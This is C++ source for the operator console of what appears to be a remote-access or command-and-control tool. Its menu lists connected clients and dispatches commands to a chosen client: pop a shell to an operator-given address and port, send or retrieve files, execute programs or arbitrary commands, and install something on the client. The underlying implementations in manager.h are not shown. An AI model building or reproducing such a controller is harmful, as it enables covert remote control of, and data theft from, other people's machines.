#include <iostream>
#include <vector>
#include <stdlib.h>
#include <python3.8/Python.h>
#include <stdexcept>

#include "manager.h"

void
showComands();

commands getInputMenu();


using namespace std;


istream& operator>>( istream& is, commands& i ){
    int tmp ;
    
    if ( is >> tmp ){
        tmp--;
        i = static_cast<commands>( tmp ) ;
    }
        
    if ((i>Exit)|| (i <help)){
        cout << "The option is not valid.";
        i=Exit;
    }
    return is ;
}



int main (int argc, char** argv) 
{

    
    manager adm;

    

    cout << "[admin front started]"<< endl;
    commands command;
    string fname,programName,address;
    unsigned client;
    unsigned port;
    bool stayInProgram = true , res;


    while (stayInProgram)
    {
        command=getInputMenu();
        switch (command)
        {
            case help: //help
                manager::Help();
                break;
            
            case frontListClients:
                cout << endl << "Command FrontListClients selected" <<endl << endl;
                adm.FrontListClients();
                break;
            
            case frontPopShell:
                cout << endl << "Command FrontPopShell selected" <<endl << endl;
                //adm.FrontListClients();
                cout <<endl<< "What client? " ;
                cin >> client;
                cout <<endl << "What address? " ;
                cin >> address;
                cout <<endl << "What port? " ;
                cin >> port;
                res = adm.FrontPopShell(client,address.c_str(),port);
                if (res  == true )
                {
                    cout << "run!" << endl;
                }
                else {
                    cout << "not run!" << endl;
                }

                break;
            
            case frontSendFile:
                cout << endl << "Command FrontSendFile selected" <<endl << endl;
                //adm.FrontListClients();
                cout << "What client? " ;
                cin >> client;
                cout << "What file? " ;
                cin >> fname;
                adm.FrontSendFile(fname,client);
                break;
                
            case frontReciveFile:
                cout  << endl << "Command FrontReciveFile selected" <<endl << endl;
                //adm.FrontListClients();
                cout << "What client? " ;
                cin >> client;
                cout << "What file? " ;
                cin >> fname;
                adm.FrontReciveFile(fname,client);
                break;
            
            case frontExecProgram:

                cout << endl << "Command FrontExecProgramhelp selected" <<endl << endl;
                //adm.FrontListClients();
                cout << "What client? " ;
                cin >> client;
                cout << "What program? " ;
                cin >> programName;
                adm.FrontExecProgram(programName,client);
                break;
            
            case frontInstall:

                cout << endl << "Command FrontInstall selected" <<endl << endl;
                //adm.FrontListClients();
                cout << "What client? " ;
                cin >> client;
                adm.FrontInstall(client);
                break;
                
            case runComand:

                cout << endl << "Command runCommand selected" <<endl << endl;
                cout << "What client? " ;
                cin >> client;
                cout << "What command? " ;
                cin >> programName;
                adm.runCommand(programName,client);
                break;

            case Exit:
                cout << "Finish the program" << endl;
                stayInProgram = false;
                break;

            default:
                cout << "Command not found." << endl;
                break;
        }
    }
    return 0;
}


void
showComands(){
    //system("clear");
    cout << "List of commands:" << endl << endl;
    cout << "1 - help" << endl;
    cout << "2 - FrontListClients" << endl;
    cout << "3 - FrontPopShell" << endl;
    cout << "4 - FrontSendFile" << endl;
    cout << "5 - FrontReciveFile" << endl;
    cout << "6 - FrontExecProgram" << endl;
    cout << "7 - FrontInstall" << endl;
    cout << "8 - RunComand" << endl;
    cout << "9 - Exit" << endl;

}

commands getInputMenu(){
    commands result=Exit;
    showComands();
    cout << "Enter the number of command:";
    cin >> result;
    return result;
}
